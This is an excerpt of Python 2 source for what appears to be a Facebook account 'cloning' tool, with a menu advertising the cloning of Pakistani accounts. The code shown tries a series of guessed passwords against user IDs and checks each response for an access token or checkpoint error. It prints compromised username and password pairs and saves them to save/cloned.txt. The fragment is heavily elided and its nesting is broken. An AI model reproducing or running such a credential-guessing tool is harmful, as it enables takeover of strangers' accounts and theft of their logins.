...
def Zeek():
    os.system('clear')
    print logo1
    print '\x1b[1;91m[1]  cloning Pakistan Accounts Active'
    time.sleep(0.10)
    print '\x1b[1;92m[2] Target Cloning commimg soon'
    time.sleep(0.10)
    print '\x1b[1;95m[3] Auto Report coming soon'
    time.sleep(0.10)
    print '\x1b[1;96m[4] Insta cloning coming soon'
    time.sleep(0.10)
    print '\x1b[1;97m[5] File Cloning coming soon'
    time.sleep(0.10)
    print '\x1b[1;91m[6] Group Cloning coming soon'
    time.sleep(0.10)
        ...
        try:
            ...
            if 'access_token' in q:
                ...
                if 'www.facebook.com' in q['error_msg']:
                    print '\033[1;91m(Bilal-CP) ' + k + c + user + '  |  ' + pass1
                    ...
                    if 'access_token' in q:
                        ...
                        if 'www.facebook.com' in q['error_msg']:
                            print '\033[1;91m(Bilal-CP) ' + k + c + user + '  |  ' + pass2
                            cps = open('save/cloned.txt', 'a')
                            ...
                            if 'access_token' in q:
                                ...
                                if 'www.facebook.com' in q['error_msg']:
                                    print '\033[1;91m(Bilal-CP) ' + k + c + user + '  |  ' + pass3 
                                    cps = open('save/cloned.txt', 'a')
                                    ...
                                    q = json.load(data)
                                    if 'access_token' in q:
                                        print '\x1b[1;93m(Bilal-okk)  ' + k + c + user + '  |  ' + pass4 
                                        okb = open('save/cloned.txt', 'a')
                                        ...
                                        if 'www.facebook.com' in q['error_msg']:
                                            ...
                                            if 'access_token' in q:
                                                ...
                                                if 'www.facebook.com' in q['error_msg']:
                                                    print '\033[1;91m(Bilal-CP) ' + k + c + user + '  |  ' + pass5 
                                                    cps = open('save/cloned.txt', 'a')
